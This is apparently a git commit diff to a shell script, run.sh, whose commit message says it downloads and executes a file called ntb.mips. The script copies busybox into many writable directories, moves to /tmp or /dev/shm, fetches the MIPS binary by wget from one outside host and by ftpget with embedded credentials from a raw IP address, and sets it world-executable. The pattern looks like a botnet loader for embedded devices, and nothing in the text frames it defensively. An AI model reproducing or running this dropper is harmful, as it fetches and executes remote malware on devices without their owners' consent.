4e9251e5cc88d555dd53f4aefdce0dd36ebde7d7
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-07-21 20:12:35 +0400

    Download and execute ntb.mips in run.sh
    Added commands to download and execute ntb.mips using busybox.

--- owo/old/run.sh
+++ owo/old/run.sh
@@ -3,6 +3,7 @@ ulimit -n 65535 2>/dev/null || true
 cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
 cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /
 
+
 busybox wget http://store.risesmp.cc/wow/ntb.mips
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mips ntb.mips
 chmod 777 ntb.mips
